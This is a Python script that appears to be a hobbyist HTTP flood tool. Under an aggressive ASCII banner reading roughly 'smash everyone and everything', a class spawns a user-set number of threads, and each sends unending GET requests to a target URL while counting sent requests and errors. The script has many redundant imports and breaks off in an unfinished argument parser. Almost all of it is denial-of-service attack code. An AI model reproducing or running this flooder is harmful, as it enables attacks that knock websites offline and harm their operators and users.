import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
# Import modules
import os
import sys
import argparse
from colorama import Fore
import threading
import random
import time
import socket
import sys
import requests 
import socks
import random
import socket
import threading
import time
import os,sys
import ssl
os.system("clear")
method = "HTTP"
print("""\033[31m
      ░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░
      ░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░
      ░░░░░░░░░░▄███████▀░░░▀███▄░░░░░
      ░░░░░░░░▄███████▀░░░░░░░▀███▄░░░
      ░░░░░░▄████████░░░░░░░░░░░███▄░░
      ░░░░░██████████▄░░░░░░░░░░░███▌░
      ░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░
      ░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░
      ░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░
      ░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░
      ░░▄██████▄░░░░░░░░░░░▀███▄███░░░
      ░█████▀▀████▄▄░░░░░░░░▄█████░░░░
      ░████▀░░░▀▀█████▄▄▄▄█████████▄░░
      ░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░ 
        
           \033[36mРазнеси всех и вся 💥
""")
time.sleep(2)


import threading
import time
import sys
import os

import requests


cc = "clear"
if sys.platform == "win32":
    cc = "cls"


class Ping():
    def __init__(self, url, threads):
        self.target = url
        self.threads = threads
        self.total = [0, 0]

        for thread in range(int(threads)):
            threading.Thread(target=self.ping, args=[url]).start()
            print(f"Thread{thread+1} started!")

        self.display()


    def display(self):
        while True:
            time.sleep(0.1)
            os.system(cc)
            print("Ping")
            print("by @rzet595\n")
            print(f"TARGET URL -> {self.target}")
            print(f"THREADS -> {self.threads}\n")
            print(f"SENT PACKAGES -> {self.total[0]}")
            print(f"ERRORS -> {self.total[1]}")




    def ping(self, url):
        while True:
            code = requests.get(url).status_code

            self.total[0] += 1
            if code > 299 or code < 200:
                self.total[1] += 1


def parse_args():
    parse_args = {}
    args = sys.argv
    for item in range(len(args)):
        if args[item].startswith("--"):
            arg = args[item].replace("--", "")
            value = args[item+1]

            parse_args[arg] = value
